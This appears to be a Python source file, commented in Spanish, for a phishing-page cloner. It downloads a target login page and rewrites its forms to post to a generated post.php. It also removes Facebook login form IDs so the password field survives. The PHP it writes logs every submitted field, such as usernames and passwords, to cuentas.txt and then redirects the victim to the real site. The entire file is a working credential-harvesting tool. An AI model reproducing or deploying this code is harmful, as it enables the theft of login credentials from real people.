import urllib.request
import urllib.error
import urllib.parse
import re
import os
from colorama import init
from colorama import Fore

init()  # Para que la librería pyfiglet imprima a color


def help():

    err_1 = (Fore.RED +
             """Error: HTTP  Error 503:  Service  Unavailable""" +
             Fore.LIGHTCYAN_EX
             )

    print(Fore.GREEN + "\n\n\n" +
          '[?] Inconvenientes al momento de clonar una página.',
          end="")
    print(Fore.LIGHTCYAN_EX + """
 ________________________________________________
| Si la página protege el acceso a sus recursos  |
| de dominios no registrados en su lista, puede  |
| que la clonación no funcione  o   esté   100%  |
| funcional.                                     |
|                                                |
|                                                |
| Si  la  página  posee un encoding diferente a  |
| UTF-8, ocurrirá un error durante la etapa  de  |
| Ajustes  de  clonación,  por  lo  que  deberá  |
| especificar el encoding de la página.          |
|                                                |
|                                                |
| Si la página clonada te  pide  actualizar  el  |
| navegador, o la clonación devuelve  un error,  |
| cambia el valor del User Agent(en la variable  |
| user_agent) a uno reciente.                    |
|                                                |
|                                                |
| Si el inicio de sesión de la página a  clonar  |
| está dividido  en  dos  URL  distintas,  solo  |
| será posible capturar los campos de una URL a  |
| la vez.                                        |
'------------------------------------------------'
    """ + "\n\n\n")
    os.system('pause')
    return


def start(url, encoding_file, user_agent):
    try:

        print('[+] Clonar página')

        # user_agent = ''
        # user_agent += 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
        # user_agent += 'AppleWebKit/537.36 (KHTML, like Gecko) '
        # user_agent += 'Chrome/83.0.4103.116 '
        # user_agent += 'Safari/537.36'
        # user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36'
        solicitud = urllib.request.Request(url,
                                           data=None,
                                           headers={
                                               'User-Agent': user_agent
                                           })

        if not user_agent:
            solicitud = url

        respuesta = urllib.request.urlopen(solicitud)
        contenidoWeb = respuesta.read()

        with open('index.html', 'wb') as f:
            f.write(contenidoWeb)

        print('[-] Clonar página')

        print('[+] Ajustes de clonación')
        # time.sleep(2)

        try:
            url_index = url.index('?')
            url_pre_proccess = url[:url_index]
        except:
            url_pre_proccess = url
        if url_pre_proccess[-1] != '/':
            url_pre_proccess += '/'

        with open('index.html', 'r+', encoding=encoding_file) as f:
            text = f.read()
            text = (re.sub(
                    r'(action="[^ ]+")|(action="")',
                    '',
                    text))
            text = (re.sub(
                    r'(<form)',
                    '<form action="post.php"',
                    text))

            text = (re.sub(
                    r'(href=")',
                    'href="' + url_pre_proccess,
                    text))
            text = (re.sub(
                    r'(href="https[^ ]+https)',
                    'href="' + 'https',
                    text))

            text = (re.sub(
                    r'(src=")',
                    'src="' + url_pre_proccess,
                    text))
            text = (re.sub(
                    r'(src="https[^ ]+https)',
                    'src="' + 'https',
                    text))

            text = (re.sub(
                    r'(id="login_form")',
                    'id=""',
                    text))
            text = (re.sub(
                    r'(id="u_0_a")',
                    'id=""',
                    text))
            # Para quitar el ID del form del login de las dos
            # páginas de facebook, ya que con js ellos borran el input de
            # la contraseña cuando se activa el form, de esta forma
            # no encontrarán el form, y no se borrará el input

        with open('index.html', 'w+', encoding=encoding_file) as f:
            f.write(text)

        print('[-] Ajustes de clonación')
        print('[+] Crear archivo de captura')

        with open('post.php', 'w+') as f:

            f.write("""
            <?php
            $entrada = "\\n\\n\\n";
            $entrada .= "------------------NEW INPUT------------------";
            foreach($_POST as $nombre_campo => $valor){
              if(strlen($valor) >= 1 && strlen($valor) <= 50){
                $entrada .= "\\n" . $nombre_campo . " -> " . $valor;
              }
            }

            $entrada .= "\\nURL CLONADA -> """ + url + """ ";

            $archivo = fopen('cuentas.txt', 'a+');
            fwrite($archivo, $entrada);
            fclose($archivo);

            header('Location: """ + url + """');
            ?>""")

        print('[-] Crear archivo de captura')

    except Exception as error:
        print(Fore.RED +
              '[!] No se pudo completar la operación, ocurrió un error.'
              '\n[!] Error: ' + str(error))
        return False

    return True
